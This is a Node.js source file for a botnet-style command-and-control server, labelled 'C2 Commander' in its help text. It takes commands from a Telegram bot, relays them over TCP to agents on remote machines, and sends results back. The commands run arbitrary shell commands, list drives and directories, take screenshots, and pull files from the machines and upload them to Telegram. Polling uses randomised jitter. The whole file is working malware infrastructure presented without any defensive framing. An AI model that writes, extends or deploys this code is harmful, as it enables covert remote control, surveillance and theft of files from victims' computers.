const net = require('net');
const https = require('https');
const fs = require('fs');
const path = require('path');
const cfg = require('./config');
const registry = require('./registry');
const agent = require('./agent');

let tcpRelay = null;
let httpRelay = null;
let telegramPoller = null;

const RELAY_LOG = cfg.LOG_FILE;
function log(msg) {
  try { fs.appendFileSync(RELAY_LOG, `[${new Date().toISOString()}] ${msg}\n`); } catch(e) {}
}

function startTCPRelay() {
  tcpRelay = net.createServer((socket) => {
    let buf = '';
    socket.on('data', (d) => {
      buf += d.toString();
      const lines = buf.split('\n');
      buf = lines.pop();
      for (const line of lines) {
        if (!line.trim()) continue;
        try {
          const msg = JSON.parse(line);
          handleAgentMessage(socket, msg);
        } catch(e) {}
      }
    });
    socket.on('close', () => {});
    socket.on('error', () => {});
  });
  tcpRelay.listen(cfg.RELAY_PORT, '0.0.0.0', () => { log(`relay ready on ${cfg.RELAY_PORT}`); });
}

function handleAgentMessage(socket, msg) {
  switch (msg.type) {
    case 'heartbeat':
      log(`hb ${msg.hostname}(${msg.id})`);
      registry.upsert(msg.id, {
        hostname: msg.hostname,
        ip: msg.ip,
        drives: msg.drives,
        os: msg.os,
        uptime: msg.uptime,
        arch: msg.arch,
        socket,
      });
      break;
    case 'cmdResult': {
      log(`cmdResult replyId=${msg.replyId} data=${(msg.data||'').slice(0,80)}`);
      const pending = pendingReplies.get(msg.replyId);
      if (pending) {
        pending.resolve(msg.data);
        pendingReplies.delete(msg.replyId);
      }
      break;
    }
    case 'offline':
      registry.remove(msg.id);
      break;
  }
}

const pendingReplies = new Map();
let replyCounter = 0;

function sendCommand(targetId, cmd, args) {
  return new Promise((resolve) => {
    const machine = registry.get(targetId);
    if (!machine || !machine.socket || !machine.socket.writable) {
      return resolve(`Error: Machine ${targetId} not connected`);
    }
    const replyId = ++replyCounter;
    pendingReplies.set(replyId, { resolve, time: Date.now() });
    const packet = JSON.stringify({ target: targetId, cmd, args, replyId }) + '\n';
    machine.socket.write(packet);
    setTimeout(() => {
      if (pendingReplies.has(replyId)) {
        pendingReplies.delete(replyId);
        resolve('Error: Command timed out');
      }
    }, 30000);
  });
}

function sendTelegram(text) {
  const data = JSON.stringify({ chat_id: cfg.TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' });
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${cfg.TELEGRAM_TOKEN}/sendMessage`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
  });
  req.on('error', (e) => { log(`tg send err: ${e.message}`); });
  req.write(data);
  req.end();
}

function sendFileToTelegram(filePath) {
  const Boundary = '----' + Date.now().toString(36);
  const bufs = [];
  bufs.push(Buffer.from('--' + Boundary + '\r\n'));
  bufs.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${path.basename(filePath)}"\r\n`));
  bufs.push(Buffer.from('Content-Type: application/octet-stream\r\n\r\n'));
  bufs.push(fs.readFileSync(filePath));
  bufs.push(Buffer.from('\r\n--' + Boundary + '--\r\n'));

  const body = Buffer.concat(bufs);
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${cfg.TELEGRAM_TOKEN}/sendDocument?chat_id=${cfg.TELEGRAM_CHAT_ID}`,
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${Boundary}`,
      'Content-Length': body.length,
    },
  });
  req.on('error', (e) => { log(`tg file send err: ${e.message}`); });
  req.write(body);
  req.end();
}

function startTelegramPoller() {
  let offset = 0;
  const poll = () => {
    const req = https.get(`https://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=20`, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          if (!data.ok || !data.result) return;
          for (const update of data.result) {
            offset = update.update_id + 1;
            handleTelegramUpdate(update);
          }
        } catch(e) {}
      });
    });
    req.on('error', (e) => { log(`poll err: ${e.message}`); });
    req.setTimeout(25000, () => { req.destroy(); });
    req.end();
    log(`poll done, offset=${offset}`);
    telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL + Math.floor(Math.random() * 10000));
  };
  log('poller starting in 10s');
  telegramPoller = setTimeout(poll, 10000);
}

function handleTelegramUpdate(update) {
  const msg = update.message || update.edited_message;
  if (!msg || !msg.text) return;
  const text = msg.text.trim();
  const chatId = msg.chat.id;
  cfg.TELEGRAM_CHAT_ID = chatId;

  log(`cmd: ${text}`);
  const parts = text.split(/\s+/);
  const cmd = parts[0].toLowerCase();

  switch (cmd) {
    case '/status': {
      const online = registry.online();
      const offline = registry.offline();
      let resp = '*Machine Registry*\n\n';
      resp += `*Online (${online.length})*\n`;
      for (const m of online) {
        resp += `  \u{1F7E2} ${m.hostname} (${m.id})\n`;
        resp += `    IP: \`${m.ip}\`\n`;
        if (m.drives && m.drives.length) {
          resp += `    Drives: ${m.drives.map(d => `${d.drive} (${d.free}GB/${d.total}GB free)`).join(', ')}\n`;
        }
        resp += `    Uptime: ${m.uptime}h\n`;
      }
      if (offline.length) {
        resp += `\n*Offline (${offline.length})*\n`;
        for (const m of offline) {
          resp += `  \u{1F534} ${m.hostname} (${m.id})\n`;
        }
      }
      sendTelegram(resp);
      break;
    }

    case '/ls': {
      const target = parts[1];
      const dir = parts.slice(2).join(' ') || 'C:\\';
      if (!target) { sendTelegram('Usage: /ls [machine] [path]'); break; }
      sendCommand(target, 'ls', dir).then(res => {
        sendTelegram(`*${target}:* \`${dir}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
      });
      break;
    }

    case '/dl': {
      const target = parts[1];
      const filePath = parts.slice(2).join(' ');
      if (!target || !filePath) { sendTelegram('Usage: /dl [machine] [filepath]'); break; }
      sendTelegram(`Pulling \`${filePath}\` from *${target}* ...`);
      sendCommand(target, 'dl', filePath).then(res => {
        try {
          const parsed = JSON.parse(res);
          if (parsed.data) {
            const buf = Buffer.from(parsed.data, 'base64');
            try { fs.mkdirSync(cfg.DOWNLOADS_DIR, { recursive: true }); } catch(e) {}
            const outFile = path.join(cfg.DOWNLOADS_DIR, parsed.name);
            fs.writeFileSync(outFile, buf);
            sendFileToTelegram(outFile);
            sendTelegram(`*${target}:* \`${filePath}\`\nSize: ${(parsed.size/1024).toFixed(1)}KB`);
          } else {
            sendTelegram(`*${target}:* \`${filePath}\`\n\`\`\`\n${res.slice(0, 2000)}\n\`\`\``);
          }
        } catch(e) {
          sendTelegram(`*${target}:* \`${filePath}\`\n\`\`\`\n${res.slice(0, 2000)}\n\`\`\``);
        }
      });
      break;
    }

    case '/exec': {
      const target = parts[1];
      const command = parts.slice(2).join(' ');
      if (!target || !command) { sendTelegram('Usage: /exec [machine] [command]'); break; }
      sendCommand(target, 'exec', command).then(res => {
        sendTelegram(`*${target}:* \`${command}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
      });
      break;
    }

    case '/tree': {
      const target = parts[1];
      const dirAndDepth = parts.slice(2).join(' ');
      const dir = dirAndDepth || 'C:\\';
      if (!target) { sendTelegram('Usage: /tree [machine] [path] [maxdepth]\nDefault depth: 5'); break; }
      sendCommand(target, 'tree', dir).then(res => {
        sendTelegram(`*${target}:* \`${dir.split('|')[0]}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
      });
      break;
    }

    case '/listall': {
      const target = parts[1];
      const dirAndDepth = parts.slice(2).join(' ');
      const dir = dirAndDepth || 'C:\\';
      if (!target) { sendTelegram('Usage: /listall [machine] [path] [maxdepth]\nDefault depth: 10'); break; }
      sendCommand(target, 'listall', dir).then(res => {
        try {
          const items = JSON.parse(res);
          const lines = items.map(i =>
            `${i.dir ? '[DIR]' : '[FIL]'} ${i.name}  ${(i.size/1024).toFixed(1)}KB  ${i.mtime.slice(0,10)}`
          );
          const chunks = [];
          let chunk = `*${target}:* \`${dir.split('|')[0]}\` (${items.length} items)\n\`\`\`\n`;
          for (const line of lines) {
            if ((chunk + line).length > 3000) {
              chunks.push(chunk + '\`\`\`');
              chunk = `\`\`\`\n${line}\n`;
            } else { chunk += line + '\n'; }
          }
          chunks.push(chunk + '\`\`\`');
          for (const c of chunks) sendTelegram(c);
        } catch(e) {
          sendTelegram(`*${target}:* \`${dir.split('|')[0]}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
        }
      });
      break;
    }

    case '/screenshot': {
      const target = parts[1];
      if (!target) { sendTelegram('Usage: /screenshot [machine]'); break; }
      sendCommand(target, 'screenshot', '').then(res => {
        sendTelegram(`*${target}:* ${res}`);
      });
      break;
    }

    case '/start':
    case '/help':
      sendTelegram(
        '*C2 Commander*\n\n' +
        '/status - Show all machines\n' +
        '/ls [machine] [path] - List directory\n' +
        '/listall [machine] [path] [depth] - Full recursive listing\n' +
        '/tree [machine] [path] [depth] - Directory tree\n' +
        '/dl [machine] [filepath] - Pull file to Telegram\n' +
        '/exec [machine] [command] - Run command\n' +
        '/screenshot [machine] - Take screenshot\n\n' +
        `File server: \`http://[IP]:${cfg.FS_PORT}\``
      );
      break;
  }
}

function init(isCommander) {
  if (isCommander) {
    startTCPRelay();
    startTelegramPoller();
  }
}

module.exports = { init, sendCommand, sendTelegram, sendFileToTelegram, handleAgentMessage };
